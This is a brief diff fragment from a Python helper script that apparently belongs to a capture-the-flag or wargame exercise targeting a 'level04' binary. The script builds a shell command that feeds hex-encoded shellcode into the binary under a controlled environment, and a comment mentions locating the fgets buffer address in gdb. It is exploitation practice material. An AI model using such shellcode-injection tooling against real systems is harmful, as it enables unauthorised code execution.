@@ -23,7 +23,6 @@ def print_shell_string(shellcode):
     shell_string = "python -c 'print(b\""
     env_end = "\")' | env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53 /home/users/level04/level04"
     print(shell_string + bytes_to_hex_string(shellcode) + env_end)
-    pass
 
 
 # On start we need to examine binary in gdb and find the address in which fgets writes buffer. Put it here
